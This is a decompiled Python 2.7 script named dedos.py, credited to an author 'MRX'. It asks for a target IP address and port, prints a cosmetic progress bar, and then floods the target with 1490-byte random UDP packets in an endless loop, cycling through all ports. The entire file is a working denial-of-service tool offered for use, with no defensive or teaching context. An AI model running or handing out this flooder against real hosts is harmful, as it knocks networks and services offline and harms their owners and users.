# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: /sdcard/Download/dedos.py
# Compiled at: 2021-03-28 23:32:31
import sys, os, time, socket, random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system('clear')
os.system('figlet 968')
print
print '\x1b[1;91mAuthor   : MRX'
print
ip = raw_input('IP BNUSA : ')
port = input('PORT CHAND BE       : ')
os.system('clear')
os.system('figlet Attack Start')
print '[           0%         ] '
time.sleep(1)
print '[      25%         ] '
time.sleep(1)
print '[      50%      ] '
time.sleep(1)
print '[    75%   ] '
time.sleep(1)
print '[       100%       ] '
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print 'Sent %s packet to %s throught port:%s' % (sent, ip, port)
    if port == 65534:
        port = 1
# okay decompiling dedos.pyc
